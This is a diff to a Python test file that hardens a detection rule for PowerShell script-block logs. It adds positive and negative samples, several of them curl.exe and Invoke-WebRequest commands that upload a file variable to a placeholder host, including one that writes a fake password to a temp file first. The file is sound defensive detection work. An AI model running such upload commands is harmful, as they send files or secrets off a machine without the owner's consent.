@@ -215,6 +215,8 @@ class RuleHardeningTests(unittest.TestCase):
         ps = re.compile(field_pattern(rules["100532"], "win.eventdata.scriptBlockText"))
         positives = [
             'curl.exe --data-binary "@$p" "https://host/upload"',
+            'curl.exe --upload-file $p https://host/upload --next https://host/health',
+            'curl.exe https://host/health --next --upload-file $p https://host/upload',
             'Invoke-WebRequest -Uri https://host/upload -Method Put -InFile $p',
             r'Invoke-WebRequest -Uri \"https://host/upload\" -Method Put -InFile $p',
             '$wc.UploadFile("https://host/upload", $p)',
@@ -228,6 +230,13 @@ class RuleHardeningTests(unittest.TestCase):
         self.assertIsNone(ps.search('curl.exe --upload-file $p ftp://ftp.example/upload --next https://host/health'))
         self.assertIsNone(ps.search('$wc.UploadFile("ftp://ftp.example/upload",$p);Invoke-WebRequest -Uri https://host/health -Method Get'))
         self.assertIsNone(ps.search('curl.exe --upload-file $p ftp://ftp.example/upload;Invoke-WebRequest -Uri https://host/health -Method Get'))
+        self.assertIsNone(ps.search('curl.exe --upload-file $p ftp://ftp.example/upload && Invoke-WebRequest -Uri https://host/health -Method Get'))
+        self.assertIsNone(ps.search('curl.exe --upload-file $p ftp://ftp.example/upload || Invoke-WebRequest -Uri https://host/health -Method Get'))
+        self.assertIsNone(ps.search('curl.exe --upload-file $p ftp://ftp.example/upload | Invoke-WebRequest -Uri https://host/health -Method Get'))
+        self.assertIsNone(ps.search("curl.exe --version && Write-Output '--upload-file $p https://host/upload'"))
+        self.assertIsNone(ps.search("curl.exe --version || Write-Output '--upload-file $p https://host/upload'"))
+        self.assertIsNone(ps.search("curl.exe --version | Write-Output '--upload-file $p https://host/upload'"))
+        self.assertIsNone(ps.search('curl.exe --version && tool.exe --upload-file $p https://host/upload'))
         self.assertIsNone(ps.search("curl.exe --upload-file $p ftp://ftp.example/upload;$wc.DownloadString('https://host/health')"))
         self.assertIsNone(ps.search("$p=Join-Path $env:TEMP 'controlled.txt';Set-Content $p 'password=CONTROLLED';curl.exe --upload-file $p ftp://ftp.example/upload;Invoke-WebRequest -Uri https://host/health -Method Get"))
 
